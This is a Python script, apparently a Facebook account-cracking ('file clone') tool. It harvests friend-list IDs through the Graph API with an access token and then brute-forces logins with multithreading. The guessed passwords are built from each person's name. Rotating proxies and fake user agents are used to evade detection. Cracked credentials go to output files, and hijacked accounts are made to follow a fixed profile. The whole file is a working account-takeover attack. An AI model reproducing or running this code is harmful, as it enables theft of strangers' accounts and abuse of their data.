#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\n [] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

ruz=[]

for mtc in range(10000):

	rr=random.randint	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"

	ruz.append(xd)

	

    

    

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo =                                          """   

 __     _______  _____  

 \ \   / /  __ \|  __ \ 

  \ \_/ /| |__) | |__) |

   \   / |  _  /|  _  / 

    | |  | | \ \| | \ \ 

    |_|  |_|  \_\_|  \_\  x Yousif_Rashid_Raham

                                                  \x1b[1;97m------------------------\x1b[1;97m------------------------

\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m YOSIF & RASHID & Raham

\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37mYRR KING

\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m YRR GT

\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m 0.0.1

\033[1;37m------------------------\033[1;37m------------------------ """                                              

 

def hasil(ok,cp):

	if not len(ok) != 0:

	    pass

	if len(cp) != 0:

	   	print(f' Crack Selesai')	

	print(f' OK : %s '%(ok))

	print(f' CP : %s '%(cp))

	input('Press enter to back SSB Menu ')

	sarfraz()

def sarfraz():

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(' [1] File Clone')

    print(' [2] Random Number')

    print(' [3] Create File')

    print(' [4] Remove dublicate lines')

    print(' [5] Separate ids')

    print(' [6] Adam Whatsapp')

    print(' [E] Exit')

    print('')

    _sarfraz___ = input(' [?] Choose option : ')

    if _sarfraz___ in ('1', '01'):

        __xxx__().sarfrazx(id)

    if _sarfraz___ in ('2', '02'):

        create_file()

    if _sarfraz___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def sarfrazx(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input('Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop,princp

        sys.stdout.write(f"\r \x1b[1;97m[YRR] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                pro = random.choice(ruz)

                session=requests.Session()

                header = {}

                r = session.get(f'https://mbasic.facebook.com', headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

            "Host": 'mbasic.facebook.com',

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": 'https://t.facebook.com/',

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?1',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?0',

            "pragma": 'no-cache',

            "priority": 'u=0',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            "user-agent": pro}

                po = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [YRR-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('YRR_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s [YRR-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('YRR_CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    print('\r%s [YRR-CP] %s | %s ' % (M, user, pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('YRR_CP.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')

        get = r.find('a', string='Ikuti').get('href')

        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):

        print('[1] Crack With Auto Pass ')

        print('[2] Crack With Name 4 Digit Pass')

        chi = input('\n [?] Choose: ')

        if chi == '':

            print('\nSelect Correct One')

            self.__pler__()

        elif chi in ('1', '01'):

            os.system("clear")

            print(logo)

            print("\033[1;31m\r Use flight (airplane) mode before use\033[1;37m")

            print(47*"-")

            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))

            print('\033[1;37m Cracking Started...')

            print(47*"-")

            with sarfrazssb(max_workers=65) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        first, last = name.split(' ')

                        firstl = first.lower()

                        lastl = last.lower()

                        firsts = first.capitalize()

                        lasts = last.capitalize()

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]

                        else:

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        elif chi in ('2', '02'):

            os.system("clear")

            print(logo)

            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")

            p1 = input(' password no : 1 : ')

            p2 = input(' password no : 2 : ')

            p3 = input(' password no : 3 : ')

            p4 = input(' password no : 4 : ')

            os.system("clear")

            print(logo)

            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")

            print(47*"-")

            print('\033[1;37m Total IDs : %s ' % len(self.id))

            print('\033[1;37m Cracking Started...')

            print(47*"-")

            with sarfrazssb(max_workers=40) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]

                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        else:

            print('\n Select Valid One')

            self.__pler__()

def create_file():

    os.system('clear')

    print(logo)

    print('  [1] Create file manual')

    print('  [2] Create file auto')

    print('  [B] Back to main menu')

    print(50*'-')

    cf = input('  Choose method: ')

    if cf =='1':

        manual()

    elif cf =='2':

        auto()

    elif cf =='3':

        likes()

    elif cf =='3' or cf =='b' or cf =='B':

        main()

    else:

        print('\n  Choose correct option ...')

        time.sleep(1)

        create_file()

def manual():

    try:

        token = open('/sdcard/tokenofl.txt', 'r').read()

    except FileNotFoundError:

        login()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token='+token).text

        q = json.loads(r)

        uname = q['name']

    except (KeyError):

        login()

    os.system('clear')

    print(logo)

    print('  Name: '+uname)

    print(50*'-')

    limit = int(input('  How many ids do you want to add ? '))

    save_file = input('  Save file as: ')

    t = 0

    for u in range(limit):

        t+=1

        try:

            ids = input('  Put id no%s: '%t)

            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text

            q = json.loads(r)

            for j in q['data']:

                uids = j['id']

                names = j['name']

                first_name = names.split(' ')[0]

                try:

                    last_name = names.split(' ')[1]

                except:

                    last_name = 'Khan'

                with open('/sdcard/'+save_file, 'a') as rd:

                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')

        except KeyError:

            print('  No friend for '+ids)

            pass

    print(50*'-')

    print('  Ids saved as: '+save_file)

    print(50*'-')

    input(' Press enter to back')

    sarfraz()

    

def auto():

    os.system('rm -rf temp*')

    try:

        access_token = open('/sdcard/tokenofl.txt', 'r').read()

    except:

        login()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text

        q = json.loads(r)

        uname = q['name']

    except:

        login()

    os.system('clear')

    print(logo)

    print('  Logged user: '+uname)

    print(50*'-')

    nusrat = []

    try:

        limit_user = int(input('  How many ids do you want to add ? '))

    except:

        limit_user = 1

    count = 0

    for fir in range(limit_user):

        count +=1

        udit = input('  Put id%s: '%(count))

        try:

            tfile = open('/sdcard/tokenofl.txt','r').read()

            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text

            qfr = json.loads(fr)

            temp_save = open('temp.txt', 'a')

            for data in qfr['data']:

                uids = data['id']

                if uids in nusrat:

                    pass

                else:

                    nusrat.append(uids)

                    temp_save.write(uids+'\n')

            temp_save.close()

        except KeyError:

            if 'invalid' in str(fr):

                print('  Logged token has expired ...')

                pass

            else:

                print('  No friends found for user: '+udit)

                pass

    os.system('clear')

    print(logo)

    print('   Total ids: '+str(len(nusrat)))

    print(50*'-')

    try:

        ask_link = int(input('  How many links do you want to grab? '))

    except:

        ask_link = 1

    completed = 0

    for links in range(ask_link):

        completed +=1

        li = input('  %s Link start with: '%completed)

        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')

    save_file = input('  Save file as: ')

    os.system('clear')

    lines = open('temp2.txt', 'r').readlines()

    print(logo)

    print('  Total ids to grab: '+str(len(lines)))

    print('  Grabbing Process has started')

    print(50*'-')

    fileid = 'temp2.txt'

    fileidopen = open(fileid, 'r').read().splitlines()

    dill = []

    for ids in fileidopen:

        try:

            tfile = open('/sdcard/tokenofl.txt','r').read()

            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text

            rgq = json.loads(rg)

            idsave=open('/sdcard/'+save_file, 'a')

            for inayat in rgq['data']:

                uids = inayat['id']

                dill.append(uids)

                nm = inayat['name']

                first_name = nm.split(' ')[0]

                try:

                    last_name = nm.split(' ')[1]

                except:

                    last_name = 'Khan'

                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')

            print('  Grabbed from: '+ids)

           # print('  Total friends: '+str(len(uids)))

            print('  Token status: Live')

            print(50*'-')

            idsave.close()

        except Exception as e:

            #print(e)

            if 'invalid' in str(rg):

                print('  Token has expired, try again ...')

                os.system('rm -rf temp*')

                pass

            else:

                print('  Grabbed from: '+ids)

                print('  Friendlist ids: 0')

                print('  Token status: Live')

                print(50*'-')

                os.system('rm -rf temp*')

                pass

    lenid = open('/sdcard/'+save_file, 'r').readlines()

    print('  Grabbing Process has completed ')

    os.system('rm -rf temp*')

    print('  Total ids grabbed: '+str(len(lenid)))

    print('  File saved as: /sdcard/'+save_file)

    print(50*'-')

    input('  Press enter to back ')

    safraz()

    

    

    

sarfraz()
